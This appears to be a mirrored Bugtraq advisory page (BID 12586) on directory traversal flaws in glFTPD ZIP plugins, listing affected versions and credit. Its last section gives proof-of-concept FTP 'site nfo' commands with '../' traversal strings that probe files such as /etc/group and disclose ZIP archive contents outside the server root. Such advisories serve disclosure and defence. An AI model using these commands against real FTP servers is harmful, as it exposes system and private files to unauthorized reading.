@@ -1,0 +1,134 @@
+#SpeeDr00t@Black Falcon<br>#bid12586<p><b><span style="font-size: 18pt;">glFTPD ZIP Plugins Multiple Directory Traversal Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12586/info">info</a><br><a href="http://www.securityfocus.com/bid/12586/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12586/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12586/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12586/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12586
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 18 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 18 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Paul Craig &lt;headpimp@pimp-industries.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					GlFtpd GlFtpd 2.0 RC7<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 RC6<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 RC5<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 RC4<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 RC3<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 RC2<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 RC1<br/>
+					
+				
+					GlFtpd GlFtpd 2.0 <br/>
+					
+				
+					GlFtpd GlFtpd 1.32 <br/>
+					
+				
+					GlFtpd GlFtpd 1.31 <br/>
+					
+				
+					GlFtpd GlFtpd 1.29.1 <br/>
+					
+				
+					GlFtpd GlFtpd 1.28 <br/>
+					
+				
+					GlFtpd GlFtpd 1.27 <br/>
+					
+				
+					GlFtpd GlFtpd 1.26 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>The following proof of concept examples are available:<br/><br/>To determine the existence of a file out side the server's root:<br/>site nfo ../etc/group<br/><br/>To determine the existence of the first two files in a directory out side the server's root:<br/>site nfo ../../../../../etc/*<br/><br/>To determine the existence of the first two files in a directory inside the server's root:<br/>site nfo staff/*<br/><br/>To determine the existence of files in the directory tree:<br/>site nfo ../../../../../etc/a*<br/><br/>To determine the existence of files in a ZIP archive:<br/>site nfo ../../*.zip<br/><br/>To disclose the contents of files with names starting with the letter 'p' in a directory:<br/>site nfo ../../backup.zip p*
+	
+		<ul>
+</ul>
+</div>
